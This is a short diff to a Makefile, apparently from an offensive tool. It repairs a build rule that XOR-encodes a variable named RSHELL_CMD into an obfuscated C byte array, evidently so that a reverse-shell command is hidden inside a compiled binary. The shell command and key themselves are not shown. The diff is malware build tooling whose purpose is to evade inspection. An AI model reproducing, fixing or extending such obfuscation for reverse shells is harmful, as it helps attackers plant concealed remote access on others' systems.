@@ -20,11 +20,13 @@ else
 endif
 
 # xor RSHELL_CMD
-DRSHELL_CMD_OBF := $(shell \
+RSHELL_CMD_OBF := $(shell \
   RSHELL_STR="$(RSHELL_CMD)"; \
-  for (( i=0; i<$$(${RSHELL_STR} | wc -c); i++ )); do \
-    c=$$(printf '%s' "$$RSHELL_STR" | cut -b$$((i+1))); \
+  i=1; \
+  while [ $$i -le $$(printf '%s' "$$RSHELL_STR" | wc -c) ]; do \
+    c=$$(printf '%s' "$$RSHELL_STR" | cut -b$$i); \
     printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
+    i=$$((i + 1)); \
   done; \
   echo "'\\x00'"; \
 )
